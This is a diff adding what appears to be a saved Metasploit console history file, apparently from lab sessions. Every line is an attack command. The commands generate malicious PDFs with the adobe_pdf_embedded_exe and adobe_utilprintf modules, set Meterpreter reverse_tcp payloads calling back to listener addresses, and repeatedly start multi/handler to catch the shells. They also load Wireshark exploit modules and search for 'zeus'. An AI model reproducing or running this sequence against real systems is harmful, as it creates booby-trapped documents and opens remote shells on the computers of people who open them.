@@ -1,0 +1,69 @@
+use adobe_pdf_embedded_exe
+use exploit/windows/fileformat/adobe_pdf_embedded_exe
+set payload windows/meterpreter/reverse_tcp
+show options
+set INFILENAME evil.pdf
+show options
+set FILENAME exploited.pdf
+set LHOST 10.208.1.51
+show options
+exploit
+set INFILENAME /home/john/\evil.pdf
+exploit
+exploit
+exploit
+exit
+use multi/handler
+set payload windows/reverse_tcp/meterpreter
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 10.208.1.51
+exploit 
+quit
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME OER.pdf
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.208.1.51
+show options
+exploit
+back
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.208.1.51
+exploit
+quit
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.208.1.51
+exploit
+exit
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.43.254
+exploit
+exit
+quit
+use multi/handler
+set LHOST 192.168.43.254
+exploit
+exploit
+exit
+use multi/handler
+set LHOST 192.168.43.254
+exploit
+use multi/handler
+set LHOST 192.168.43.254
+search wireshark
+use exploit/windows/misc/wireshark_lua
+show options
+back
+use windows/meterpreter/reverse_tcp
+set LHOST 192.168.0.102
+show options
+exit
+search wireshark
+use exploit/windows/fileformat/wireshark_packet_dect
+set payload
+show options
+search zeus
+quit
